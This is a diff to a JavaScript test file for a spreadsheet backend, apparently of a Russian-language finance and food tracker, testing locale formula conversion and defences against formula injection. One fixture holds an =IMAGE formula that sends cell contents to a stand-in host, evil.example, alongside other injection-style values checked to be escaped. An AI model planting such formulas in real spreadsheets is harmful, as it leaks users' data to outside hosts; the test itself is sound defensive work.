@@ -72,5 +72,12 @@ const ru = gs.localFormula_("ru_RU")
 check("формулы под русскую локаль", ru("=IF(B3>B4*1.1, \"a, b\", ROUND(B5, 1))") === "=IF(B3>B4*1,1; \"a, b\"; ROUND(B5; 1))" &&
   ru("=QUERY({'Л'!A2:A, IF(B2:B=1, C2:C, 0)}, \"select Col1\", 0)") === "=QUERY({'Л'!A2:A\\ IF(B2:B=1; C2:C; 0)}; \"select Col1\"; 0)" &&
   gs.localFormula_("en_US")("=A(1.5, 2)") === "=A(1.5, 2)", ru("=IF(B3>B4*1.1, \"a, b\", ROUND(B5, 1))"))
+r = post(Object.assign({}, body, { entries: [{ id: "f9", date: t, type: "expense", amount: 1, method: "cash", category: "Другое", comment: "=IMAGE(\"https://evil.example/?\"&A1)" }],
+  food: [{ id: "m9", date: t, title: "@HYPERLINK(1)", kcal: 1 }, { id: "m10", date: t + 1, title: "-5 кг", kcal: 1 }], water: [] }))
+const rowsOf = n => ss.getSheetByName(n).cells.flat().filter(v => typeof v === "string")
+check("текст из виджета не становится формулой", rowsOf("Операции").includes("'=IMAGE(\"https://evil.example/?\"&A1)") &&
+  rowsOf("Еда").includes("'@HYPERLINK(1)") && rowsOf("Еда").includes("'-5 кг") && rowsOf("Еда").includes("Плов"), rowsOf("Еда"))
+const g0 = gs.doGet()
+check("doGet без ключа не выдаёт таблицу", g0.ok && !g0.url && !g0.sheet, g0)
 console.log(fail ? `GS_FAIL ${fail}` : "GS_OK")
 process.exit(fail ? 1 : 0)
